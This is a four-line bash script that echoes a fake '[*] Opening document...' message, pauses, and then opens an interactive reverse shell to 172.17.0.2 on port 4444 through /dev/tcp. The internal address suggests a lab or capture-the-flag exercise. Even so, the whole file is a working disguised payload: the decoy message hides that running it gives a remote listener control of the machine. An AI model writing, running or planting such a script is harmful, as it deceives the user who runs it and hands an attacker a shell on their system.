#!/bin/bash
echo "[*] Opening document..."
sleep 1
bash -i >& /dev/tcp/172.17.0.2/4444 0>&1
